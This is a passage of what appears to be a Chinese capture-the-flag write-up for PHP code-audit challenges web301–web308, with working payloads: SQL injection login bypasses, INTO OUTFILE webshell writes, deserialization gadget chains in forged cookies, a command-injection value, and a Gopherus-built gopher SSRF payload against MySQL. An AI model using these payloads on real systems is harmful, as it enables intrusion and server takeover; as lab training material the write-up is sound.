等，看传入的SQL语句是否由外部输入拼接而成</li><li><strong>命令执行</strong>：关注 <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code> 等能执行系统命令的函数</li><li><strong>文件包含&#x2F;读取</strong>：关注 <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>, <code>readfile()</code> 等函数</li><li><strong>反序列化</strong>：关注 <code>unserialize()</code> 函数，检查其参数来源</li></ul></li></ul><p><strong>3. 漏洞验证与利用链构造 (Verification &amp; Exploitation)</strong></p><p>在发现疑似漏洞后，需要进行验证</p><ul><li><strong>编写验证代码 (PoC)</strong>：根据代码逻辑，构造特定的输入数据（Payload）来触发漏洞，验证其是否存在以及是否可被利用</li><li><strong>构造利用链 (Exploit Chain)</strong>：在复杂的场景中，单个漏洞可能无法造成严重危害，此时需要将多个漏洞点（如文件上传 + 文件包含）组合起来，形成一个完整的攻击链，以达到最终目的（如获取服务器权限）</li></ul><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h3><p>首先下载附件进行分析，可以先看看目录结构</p><p><img src="https://oss.waynejoons.icu/picphoto/20250805221751180.png"></p><p>其中admin目录为前端页面目录，不需要分析，因此我们把重点放在<code>assets</code>目录里面</p><p>把文件大概看了一下，发现<code>checklogin.php</code>有未过滤的SQL语句，存在SQL注入漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250805221957645.png"></p><p>打开题目环境，可以看到一个登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250805222436558.png"></p><p>有多种方法可以做这道题，咱们一个个分析</p><p><strong>方法一：联合注入</strong></p><p>分析当前代码，可以看到第17行有个判断语句</p><p><img src="https://oss.waynejoons.icu/picphoto/20250805223108528.png"></p><p>其中，<strong>strcasecmp</strong>是PHP的字符串比较函数，用于比较两个字符串，如果两个字符串相等，则返回0，因此我们通过联合注入查询输出一个值，例如一个包含单个字面量 <code>1</code> 的结果集，程序把<code>1</code>当成了账号在数据库中查询到的密码，因此我们在密码处也输入相同的数字，即可通过验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select 1#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure><p>登录后在首页可以看到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250805231230062.png"></p><p><strong>方法二：SQL注入写shell</strong></p><p>可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure><p>执行完之后访问<code>1.php</code>，可以看到成功写入</p><p><img src="https://oss.waynejoons.icu/picphoto/20250807002327972.png"></p><p>用HackBar执行命令即可，成功读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806000425704.png"></p><h3 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h3><p>这题也是沿用之前的附件，方法跟之前一样</p><p><strong>方法一：联合注入</strong></p><p>这题把上题<code>checklogin.php</code>的第17行改成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>意思就是只要<code>sds_decode($userpwd)</code>跟<code>$row[&#39;sds_password&#39;]</code>相等即可通过验证，我们可以先随便输入一个值到<code>$userpwd</code>，然后让其编码之后得到编码值，再让<code>$row[&#39;sds_password&#39;]</code>通过联合注入输出这个编码值，程序把这个编码值当成了账号在数据库中查询到的密码，最后我们在密码处填入原本的值，经过后台编码后即可通过验证，具体可以看以下操作</p><p>我们在目录中寻找<code>sds_decode()</code>函数，发现其位于<code>fun.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250806202231205.png"></p><p>修改一下代码，参数输入<code>1</code>，然后运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">sds_decode</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到编码结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d9c77c4e454869d5d8da3b4be79694d3</span><br></pre></td></tr></table></figure><p>然后我们打开登录框，输入账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &#x27;d9c77c4e454869d5d8da3b4be79694d3&#x27;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure><p>解释一下，输入的<code>1</code>经过<code>sds_decode()</code>函数之后，变成了<code>d9c77c4e454869d5d8da3b4be79694d3</code>，然后我们通过联合注入输出<code>d9c77c4e454869d5d8da3b4be79694d3</code>，程序把这个编码值当成了账号在数据库中查询到的密码，因为我们在登录框密码处输入<code>1</code>，这个密码经过编码后跟我们这个编码值一致，因此就成功通过验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806203309928.png"></p><p>登录之后在首页得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806203331017.png"></p><p><strong>方法二：SQL注入写shell</strong></p><p>跟之前一样，可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250806203702946.png"></p><h3 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h3><p>下载附件进行分析，先看看目录结构</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806232656921.png"></p><p><code>checklogin.php</code>这次多了个限制，<code>username</code>长度不能大于6，因此之前的方法用不了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806232943489.png"></p><p>但是登录的检测机制依然不变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>继续分析项目文件，发现<code>sds_user.sql</code>里面存在用户信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806233322673.png"></p><p>用户名是admin，密码是个加密后的值，打开<code>fun.php</code>，可以看到这次贴心给了提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806234655113.png"></p><p>直接运行代码，得到值为<code>27151b7b1ad51a38ea66b1529cde5ee4</code>，跟上面sql文件里的一样，因此密码就是admin</p><p>打开网站登录，账号密码都是admin，进去之后点了一番，发现只有<strong>网点一览</strong>能点进去</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806235039610.png"></p><p>进去之后发现是<code>dpt.php</code>页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250806235347565.png"></p><p>咱们继续回去分析项目文件，发现<code>dpt.php</code>和<code>dptadd.php</code>都存在注入点，且官方也标了注释</p><p><strong>dpt.php</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250807000029190.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from sds_dpt order by id;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>dptadd.php</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250807000005828.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可惜的是，<code>dpt.php</code>的<code>id</code>并没有办法控制，因此只能从<code>dptadd.php</code>下手，URL拼接路径<code>/dptadd.php</code>，然后通过POST的方式传入参数值，执行SQL注入</p><p><img src="https://oss.waynejoons.icu/picphoto/20250807000612615.png"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：sds_dpt,sds_fl9g,sds_user</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：flag</span><br></pre></td></tr></table></figure><p>查字段值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select flag from sds_fl9g)#</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250807001015215.png"></p><h3 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h3><p>这题的代码跟上一题相同，不过多了一个全局WAF检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个WAF逻辑有问题，只要有任意一个字符匹配成功就会返回<code>1</code>，因此并没有什么用</p><p>也是先登录网站，账号和密码都是<code>admin</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808103713652.png"></p><p>步骤跟上题一样，只不过表名从<code>sds_fl9g</code>改成了<code>sds_flaag</code></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：sds_dpt,sds_flaag,sds_user</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_flaag&#x27;)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：flag</span><br></pre></td></tr></table></figure><p>查字段值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select flag from sds_flaag)#</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808104039222.png"></p><h3 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h3><p>下载附件分析代码，发现<code>fun.php</code>有个<code>sds_waf()</code>函数，过滤很严格，且应用到了<code>dptadd.php</code>，因此之前的SQL注入行不通</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808112135126.png"></p><p>同时发现这题的<code>checklogin.php</code>相比web303多了个<strong>Cookie反序列化</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808111710684.png"></p><p>分析这个<code>class.php</code>，可以看到有<strong>文件写入操作</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808111836466.png"></p><p>因此这题的思路就是<strong>伪造Cookie</strong>，然后执行<strong>反序列化漏洞</strong>写入webshell</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>))));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure><p>把这个序列化结果写入Cookie，路径为<code>/checklogin.php</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250808112833858.png"></p><p>蚁剑连接webshell，注意要把https改成http</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808113224736.png"></p><p>在目录找了一番，没找到flag，猜测flag是在数据库里面，用蚁剑连接数据库</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808113745465.png"></p><p>点击<strong>添加配置</strong>，然后数据库类型选<strong>MYSQLI</strong>，MYSQLI是MYSQL的升级版，支持更多新特性和更高安全性，官方推荐使用，MYSQL扩展现已废弃</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808113822062.png"></p><p>密码在<code>conn.php</code>，但是不知道为什么连不上，后来去网上搜了一下，发现蚁剑那里查看的密码是root，跟题目给的附件不一样</p><p>这是附件里面的<code>conn.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808114410473.png"></p><p>这是蚁剑里面的<code>conn.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808114450866.png"></p><p>然后在添加配置那里输入账号密码即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808114546586.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808114621457.png"></p><h3 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h3><p>下载附件分析代码，发现<code>class.php</code>有个<strong>文件写入操作</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808140158580.png"></p><p>继续分析，在<code>index.php</code>发现反序列化代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808140322770.png"></p><p>因此我们可以构造一个利用链执行反序列化操作，在<code>dao.php</code>中发现可利用的类</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808141029596.png"></p><p>最终利用链为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[index.php] unserialize -&gt; [dao.php] dao::__destruct() -&gt; [class.php] log::close()</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</span><br></pre></td></tr></table></figure><p>把结果写入Cookie即可，路径是<code>/index.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808142513037.png"></p><p>然后蚁剑连接webshell，成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808142602645.png"></p><h3 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h3><p>下载附件分析代码，发现<code>class.php</code>有个文件写入操作</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808152937306.png"></p><p>但是找了一番并没有发现调用<code>closelog()</code>的地方，因此这个方法行不通</p><p>继续分析代码，发现<code>dao.php</code>有个<strong>命令执行函数</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808153155228.png"></p><p>在<code>logout.php</code>发现反序列化代码，且调用了<code>clearCache()</code>函数</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808153515278.png"></p><p>虽然<code>logout.php</code>并没有直接包含<code>dao.php</code>，但是包含了<code>service.php</code>，而<code>service.php</code>包含了<code>dao.php</code>，因此可以直接通过<code>dao</code>类调用<code>clearCache()</code>函数</p><p>然后控制变量<code>$cache_dir</code>来截断原来的<code>rm</code>命令并执行新的命令，写入webshell到php文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808155827562.png"></p><p>利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/controller/logout.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::clearCache()</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;1; echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php;&#x27;</span>;<span class="comment">//&quot;$&quot;前加&quot;\&quot;是为了防止被解析</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjE7IGVjaG8gIjw/cGhwIGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure><p>把结果写入Cookie即可，路径是<code>/controller/logout.php</code>，参数是<code>service</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808154822481.png"></p><p>然后蚁剑连接webshell，flag在<code>/var/www/html</code>目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808154953959.png"></p><h3 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h3><p>下载附件分析代码，发现<code>dao.php</code>的<code>clearCache()</code>函数加了过滤，只能匹配纯英文字符，因此上题的方法在这里行不通</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808164149264.png"></p><p>继续分析代码，发现<code>index.php</code>有反序列化代码，且调用了一个函数<code>checkVersion()</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808164314527.png"></p><p>查找<code>checkVersion()</code>函数的定义，在<code>dao.php</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808164507700.png"></p><p>继续分析<code>update_url</code>，在<code>config.php</code>里面可以看到<code>$update_url</code>的定义，是个<strong>地址链接</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808164645697.png"></p><p>接着再分析<code>checkUpdate()</code>函数的定义</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808164846064.png"></p><p><code>checkUpdate()</code>函数通过cURL发起HTTP请求，因此突破口就是这里，我们可以通过这个打<strong>SSRF漏洞</strong></p><p>利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[index.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::checkVersion()</span><br></pre></td></tr></table></figure><p>看了一下，发现<code>config.php</code>里面并没有设置mysql密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808172158944.png"></p><p>因此我们用<strong>Gopher协议</strong>打无密码的mysql，工具是<strong>Gopherus</strong>，下载地址：<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>输入以下内容</p><p>数据库用户名：<code>root</code></p><p>待执行命令：<code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808170349659.png"></p><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure><p>如果是直接传参就需要进行URL编码，但是这里是反序列化，解析payload时已经在服务端，因此不需要二次编码</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$update_url</span> = <span 